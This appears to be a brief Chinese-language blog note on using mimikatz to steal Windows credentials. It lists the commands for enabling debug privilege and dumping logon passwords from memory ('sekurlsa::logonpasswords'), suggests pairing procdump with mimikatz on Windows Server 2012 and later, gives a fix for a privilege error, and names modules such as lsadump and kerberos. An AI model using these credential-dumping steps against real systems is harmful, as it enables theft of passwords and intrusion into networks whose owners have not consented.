https://blog.csdn.net/weixin_40412037/article/details/113348310

提升权限 命令：
privilege::debug

在windows2012以上的系统不能直接获取明文密码了，当可以搭配procdump+mimikatz获取密码。
mimikatz # log
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

windows打印type
linux打印cat

解决：ERROR kuhl m_privilege simple: Rtiadjustprivilege (20) c0000061
https://blog.csdn.net/weixin_45791884/article/details/118861726


sekurlsa：  与证书相关的模块
privilege： 提权相关模块
lsadump：   LsaDump模块
kerberos：  kerberos模块


Kerberos 是一种身份认证协议
https://zhuanlan.zhihu.com/p/266491528

